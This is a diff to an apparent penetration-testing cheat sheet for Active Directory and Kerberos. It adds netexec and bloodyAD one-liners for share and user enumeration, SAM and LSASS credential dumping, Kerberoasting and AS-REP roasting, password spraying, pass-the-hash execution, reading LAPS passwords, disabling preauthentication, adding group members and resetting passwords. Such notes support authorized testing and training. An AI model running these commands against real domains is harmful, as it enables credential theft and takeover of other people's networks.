@@ -251,6 +251,15 @@ export KRB5CCNAME='realpath <FILE>.ccache'
   default_realm = REALM.TLD
   dns_lookup_kdc = true
   dns_lookup_realm = true
+
+  [realms]
+    REALM.TLD = {
+        kdc = <fqdn>
+    }
+
+[domain_realm]
+    .<domain.tld> = REALM.TLD
+    <domain.tld> = REALM.TLD
 ```
 
 ##### Ticket Conversion
@@ -333,6 +342,7 @@ sudo ntpdate <RHOST>
 sudo ntpdate -b -u <RHOST>
 sudo timedatectl set-timezone UTC
 while [ 1 ]; do sudo ntpdate <RHOST>;done    # continuous sync
+sudo net time -S <IP>
 ```
 
 ---
@@ -1273,6 +1283,7 @@ faketime 'now + 8 hours' bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAI
 
 ```bash
 # SMB
+netexec smb <RHOST> -u '' -p '' --pass-pol                                                      # password policy
 netexec smb <RHOST> -u '' -p '' --shares
 netexec smb <RHOST> -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
@@ -1282,13 +1293,15 @@ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
 netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
 
 # LDAP
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users                             # active AD users
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq                                     # MachineAccountQuota lets users add domain computers.
 
 # WinRM
 netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d .
-netexec winrm <RHOST> -d <DOMAIN> -u users -p passwords --continue-on-success             # Password spray
+netexec winrm <RHOST> -d <DOMAIN> -u users -p passwords --continue-on-success                   # Password spray
 
 # SSH
 nxc ssh <RHOSTS> -u userfile -p passwordfile --no-bruteforce
@@ -1326,11 +1339,17 @@ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 #### bloodyAD
 
 ```bash
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota
+# GET
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<TLD>' --type user
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<TLD>' --attr ms-DS-MachineAccountQuota
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get membership <USER>                                                       # Group membership determines effective user privileges.
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "Domain Admins" --attr member                                    # Lists high-privileged Domain Admin members.
+# ADD
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH
+
+# SET
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'
 ```
 
